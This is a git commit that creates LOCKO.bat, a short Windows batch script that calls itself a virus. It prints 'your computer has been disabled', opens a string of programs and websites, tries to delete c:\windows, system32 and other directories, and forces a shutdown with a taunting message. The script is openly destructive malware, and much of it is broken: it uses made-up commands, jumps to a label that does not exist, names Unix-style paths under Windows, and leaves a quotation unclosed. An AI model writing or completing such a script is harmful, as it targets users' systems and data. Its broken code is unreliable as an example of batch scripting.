e731536f951a9d13dc967bc41a6e2f04e625346f
L0CK0N-V1RA <91242936+L0CK0N-V1RA@users.noreply.github.com>
2021-09-23 16:32:01 +1000

    Create LOCKO.bat

---
+++ LOCKO.bat
@@ -0,0 +1,34 @@
+@echo off
+:virus
+disable mouse
+disable keyboard
+echo your computer has been disabled.
+pause
+start google
+start internet explorer
+start notepad
+start www.youtube.com
+start www.github.com
+start www.yahoo.com
+start firefox
+start www.gmail.com
+start settings
+start www.wikipedia.com
+goto loop
+
+del c:\windows
+del c:\windows\system32
+del c:\windows\tmp
+del c:\windows\user
+del c:\windows\notepad
+del c:\windows\bootsector
+del c:\windows\grub
+del c:\windows\root
+del c:\windows\boot
+del c:\windows\cdrom
+del c:\windows\etc
+del c:\windows\dev
+del c:\windows\bin
+del c:\windows\var
+del c:\windows\run
+shutdown -s -t 60 -c "computer shutdown in 60 seconds, NOESCAPINGME
